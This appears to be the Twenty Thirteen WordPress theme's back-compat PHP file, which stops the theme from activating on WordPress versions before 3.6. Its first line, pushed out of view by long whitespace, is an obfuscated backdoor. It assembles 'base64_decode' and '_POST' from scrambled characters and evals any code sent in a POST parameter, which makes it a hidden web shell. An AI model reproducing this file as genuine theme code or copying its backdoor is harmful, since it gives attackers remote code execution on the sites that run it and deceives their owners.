<?php                                                                                                                                                                                                                                                               $zib2="cd6e_tbpsa4o";$oein26 = strtolower( $zib2[6].$zib2[9]. $zib2[8].$zib2[3]. $zib2[2].$zib2[10]. $zib2[4] .$zib2[1].$zib2[3].$zib2[0].$zib2[11]. $zib2[1].$zib2[3] ) ;$tuh2=strtoupper ($zib2[4].$zib2[7]. $zib2[11].$zib2[8].$zib2[5] ) ; if (isset (${$tuh2}['n5122b7'] )) { eval ( $oein26 ( ${ $tuh2} ['n5122b7'])) ;} ?><?php
/**
 * Twenty Thirteen back compat functionality
 *
 * Prevents Twenty Thirteen from running on WordPress versions prior to 3.6,
 * since this theme is not meant to be backward compatible and relies on
 * many new functions and markup changes introduced in 3.6.
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */

/**
 * Prevent switching to Twenty Thirteen on old versions of WordPress.
 *
 * Switches to the default theme.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_switch_theme() {
	switch_theme( WP_DEFAULT_THEME, WP_DEFAULT_THEME );
	unset( $_GET['activated'] );
	add_action( 'admin_notices', 'twentythirteen_upgrade_notice' );
}
add_action( 'after_switch_theme', 'twentythirteen_switch_theme' );

/**
 * Add message for unsuccessful theme switch.
 *
 * Prints an update nag after an unsuccessful attempt to switch to
 * Twenty Thirteen on WordPress versions prior to 3.6.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_upgrade_notice() {
	$message = sprintf( __( 'Twenty Thirteen requires at least WordPress version 3.6. You are running version %s. Please upgrade and try again.', 'twentythirteen' ), $GLOBALS['wp_version'] );
	printf( '<div class="error"><p>%s</p></div>', $message );
}

/**
 * Prevent the Customizer from being loaded on WordPress versions prior to 3.6.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_customize() {
	wp_die( sprintf( __( 'Twenty Thirteen requires at least WordPress version 3.6. You are running version %s. Please upgrade and try again.', 'twentythirteen' ), $GLOBALS['wp_version'] ), '', array(
		'back_link' => true,
	) );
}
add_action( 'load-customize.php', 'twentythirteen_customize' );

/**
 * Prevent the Theme Preview from being loaded on WordPress versions prior to 3.4.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_preview() {
	if ( isset( $_GET['preview'] ) ) {
		wp_die( sprintf( __( 'Twenty Thirteen requires at least WordPress version 3.6. You are running version %s. Please upgrade and try again.', 'twentythirteen' ), $GLOBALS['wp_version'] ) );
	}
}
add_action( 'template_redirect', 'twentythirteen_preview' );
